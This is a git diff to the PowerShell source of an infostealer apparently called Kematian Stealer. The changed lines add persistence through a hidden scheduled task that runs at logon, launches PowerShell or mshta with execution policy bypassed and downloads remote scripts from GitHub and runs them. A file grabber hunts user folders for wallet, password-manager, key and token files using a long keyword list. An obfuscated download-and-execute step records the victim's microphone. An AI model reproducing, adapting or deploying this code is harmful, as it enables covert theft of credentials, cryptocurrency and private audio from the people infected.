@@ -7,7 +7,8 @@
 #$persistence = $false
 #$write_disk_only = $false
 #$vm_protect = $false
-#$record_mic = $true
+#$record_mic = $false
+#$webcam = $false
 #$encryption_key = "YOUR_ENC_KEY_HERE"
 [Net.ServicePointManager]::SecurityProtocol = "Tls, Tls11, Tls12, Ssl3"
 
@@ -84,10 +85,10 @@ function Invoke-TASKS {
         $KDOT_DIR.Attributes = "Hidden", "System"
         $task_name = "Kematian"
         $task_action = if ($debug) {
-            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://raw.githubusercontent.com/Agonyxxx/Injection/main/main.ps1'|iex`""
+            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer/main/frontend-src/main.ps1'|iex`""
         }
         else {
-            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://raw.githubusercontent.com/Agonyxxx/Injection/main/main.ps1'|iex`",0)(window.close)"
+            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer/main/frontend-src/main.ps1'|iex`",0)(window.close)"
         }
         $task_trigger = New-ScheduledTaskTrigger -AtLogOn
         $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
@@ -958,7 +959,7 @@ function Backup-Data {
     function FilesGrabber {
         $item_limit = 100
         $allowedExtensions = @("*.jpg", "*.png", "*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log", "*.pem", "*.ppk", "*.key", "*.pfx")
-        $keywords = @("2fa", "account", "auth", "backup", "bank", "binance", "bitcoin", "bitwarden", "btc", "casino", "code", "coinbase ", "crypto", "dashlane", "discord", "eth", "exodus", "facebook", "funds", "info", "keepass", "keys", "kraken", "kucoin", "lastpass", "ledger", "login", "mail", "memo", "metamask", "mnemonic", "nordpass", "note", "pass", "passphrase", "paypal", "pgp", "private", "pw", "recovery", "remote", "roboform", "secret", "seedphrase", "server", "skrill", "smtp", "solana", "syncthing", "tether", "token", "trading", "trezor", "venmo", "vault", "wallet")
+        $keywords = @("2fa", "acc", "account", "auth", "backup", "bank", "binance", "bitcoin", "bitwarden", "btc", "casino", "code", "coinbase ", "crypto", "dashlane", "discord", "eth", "exodus", "facebook", "funds", "info", "keepass", "keys", "kraken", "kucoin", "lastpass", "ledger", "login", "mail", "memo", "metamask", "mnemonic", "nordpass", "note", "pass", "passphrase", "proton", "paypal", "pgp", "private", "pw", "recovery", "remote", "roboform", "secret", "seedphrase", "server", "skrill", "smtp", "solana", "syncthing", "tether", "token", "trading", "trezor", "venmo", "vault", "wallet")
         $paths = @("$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop")
         foreach ($path in $paths) {
             $files = Get-ChildItem -Path $path -Recurse -Include $allowedExtensions | Where-Object {
@@ -993,18 +994,18 @@ function Backup-Data {
 
     # record mic for 10 sec
     if ($record_mic) {
-    Write-Host "[!] Recording PC MIC for 10 seconds" -ForegroundColor Green
-    $mic = ("https://github.com/Somali-Devs/Kematian-Stealer/raw/main/frontend-src/mic.ps1")
-    $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$mic')"
-    $invokemic = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
-    $invokemic.WaitForExit()
-    $mic_image = "$env:temp\mic.wav"
-    if (Test-Path -Path $mic_image) {
-        Move-Item -Path $mic_image -Destination $folder_general
-        Write-Host "[!] The mic.wav file moved successfully to $folder_general" -ForegroundColor Green
-    } else {
-        Write-Host "[!] The mic.wav file does not exist." -ForegroundColor Red
-     }
+        Write-Host "[!] Recording PC MIC for 10 seconds" -ForegroundColor Green
+        $mic = ("https://github.com/Somali-Devs/Kematian-Stealer/raw/main/frontend-src/mic.ps1")
+        $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$mic')"
+        $invokemic = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
+        $invokemic.WaitForExit()
+        $mic_file = "$env:temp\mic.wav"
+        if (Test-Path -Path $mic_file) {
+            Move-Item -Path $mic_file -Destination $folder_general
+            Write-Host "[!] The mic.wav file moved successfully to $folder_general" -ForegroundColor Green
+        } else {
+            Write-Host "[!] The mic.wav file does not exist." -ForegroundColor Red
+        }
     }
 
     $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe"
